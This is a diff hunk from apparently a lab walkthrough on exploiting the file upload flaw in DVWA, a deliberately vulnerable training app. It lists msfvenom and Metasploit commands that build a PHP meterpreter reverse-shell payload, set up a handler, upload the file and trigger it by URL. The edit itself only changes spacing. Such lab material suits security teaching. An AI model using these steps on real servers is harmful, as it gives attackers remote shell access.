@@ -57,9 +57,9 @@ And a path Eg. “C:\wamp64\www\DVWA\hackable\uploads\”
 4. msfconsole
 5. msfvenom -p php/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw >exploit.php 
     - Creates a php file with a reverse shell going to localhost:4444
-6. > use exploit/multi/handler
+6. >use exploit/multi/handler
     - Handles the exploit and gives shell
-7. > set payload php/meterpreter/reverse_tcp
+7. >set payload php/meterpreter/reverse_tcp
 8. Set LHOST <target ip>
 9. Upload the created exploit.php file
 10. Open a terminal and type run. Put URL into browser and should create a meterpreter session.
